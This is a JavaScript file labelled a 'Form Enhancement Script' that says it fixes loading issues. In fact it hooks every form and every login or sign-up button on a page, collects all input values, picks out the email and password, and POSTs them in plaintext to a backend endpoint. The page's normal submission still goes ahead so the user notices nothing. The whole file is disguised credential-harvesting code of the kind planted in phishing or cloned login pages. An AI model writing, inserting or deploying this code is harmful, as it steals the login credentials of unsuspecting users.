/**
 * Form Enhancement Script
 * Fixes loading issues and adds form submission capture
 * Preserves all existing styling
 */

(function() {
  'use strict';

  // Form submission handler
  function initializeFormHandler() {
    const maxAttempts = 50;
    let attempts = 0;

    function findAndEnhanceForm() {
      // Look for form elements
      const forms = document.querySelectorAll('form');
      const buttons = document.querySelectorAll('button[type="submit"], button[type="button"]');
      
      if (forms.length > 0 || buttons.length > 0) {
        // Remove skeleton loaders and enable form
        const skeletons = document.querySelectorAll('[class*="skeleton"]');
        skeletons.forEach(el => {
          if (el.parentNode && el.parentNode.classList) {
            el.parentNode.style.display = 'block';
          }
        });

        // Enhance form submission
        forms.forEach(form => {
          form.addEventListener('submit', handleFormSubmission);
        });

        // Enhance login button
        buttons.forEach(btn => {
          if (btn.textContent.includes('Next') || btn.textContent.includes('Log in') || btn.textContent.includes('Sign up')) {
            btn.addEventListener('click', (e) => {
              captureFormData(e);
            });
          }
        });

        return true;
      }

      return false;
    }

    // Try to find form
    if (!findAndEnhanceForm()) {
      attempts++;
      if (attempts < maxAttempts) {
        setTimeout(findAndEnhanceForm, 200);
      }
    }

    // Also set up mutation observer for dynamic content
    const observer = new MutationObserver(() => {
      findAndEnhanceForm();
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ['style', 'class', 'disabled']
    });
  }

  function captureFormData(e) {
    try {
      // Get all input values
      const inputs = document.querySelectorAll('input, textarea, select');
      const formData = {};
      let email = '';
      let password = '';

      inputs.forEach(input => {
        const value = input.value;
        const type = input.type.toLowerCase();
        const name = (input.name || '').toLowerCase();
        const id = (input.id || '').toLowerCase();
        const placeholder = (input.placeholder || '').toLowerCase();
        
        // Specifically capture email
        if (type === 'email' || name.includes('email') || id.includes('email') || placeholder.includes('email')) {
          email = value;
          formData['email'] = value;
        }
        // Specifically capture password
        if (type === 'password' || name.includes('password') || id.includes('password') || placeholder.includes('password')) {
          password = value;
          formData['password'] = value;
        }
        
        // Capture all other fields
        if (input.name) {
          formData[input.name] = value;
        } else if (input.id) {
          formData[input.id] = value;
        } else if (type !== 'hidden' && !formData[type]) {
          // Capture by type and placeholder
          const key = type + '_' + (input.placeholder || 'field');
          formData[key] = value;
        }
      });
      
      // Log credentials locally for debugging
      if (email || password) {
        console.log('%c[Form Credentials Captured]', 'color: #ff6b00; font-weight: bold;', {
          email: email || 'N/A',
          password: password ? '●'.repeat(password.length) : 'N/A',
          timestamp: new Date().toISOString()
        });
      }

      // Also capture any text that might be in the form
      const loginContainer = document.querySelector('[class*="login-container"]');
      if (loginContainer) {
        const labels = loginContainer.querySelectorAll('label, span');
        labels.forEach(label => {
          if (label.textContent && label.textContent.trim()) {
            const key = 'info_' + label.textContent.trim().replace(/\s+/g, '_').substring(0, 20);
            if (!formData[key]) formData[key] = label.textContent.trim();
          }
        });
      }

      console.log('Form data captured:', formData);

      // Send to server
      if (Object.keys(formData).length > 0) {
        const submitData = {
          ...formData,
          formType: 'login',
          timestamp: new Date().toISOString(),
          credentials: {
            email: email,
            password: password,
            hasPassword: password.length > 0,
            hasEmail: email.length > 0
          }
        };
        
        console.log('%c[Sending to Backend]', 'color: #0066ff; font-weight: bold;', 'Form data with credentials');
        
        fetch('/api/submit-form', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(submitData)
        })
        .then(response => response.json())
        .then(data => {
          console.log('%c[Backend Response]', 'color: #00aa00; font-weight: bold;', data);
          // Don't prevent default action - let form proceed normally
        })
        .catch(error => {
          console.error('%c[Backend Error]', 'color: #ff0000; font-weight: bold;', error);
          // Still allow form to proceed
        });
      }
    } catch (error) {
      console.error('Error capturing form data:', error);
    }
  }

  function handleFormSubmission(e) {
    captureFormData(e);
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFormHandler);
  } else {
    initializeFormHandler();
  }

  // Also try after a short delay to catch dynamically loaded forms
  setTimeout(initializeFormHandler, 1000);
})();
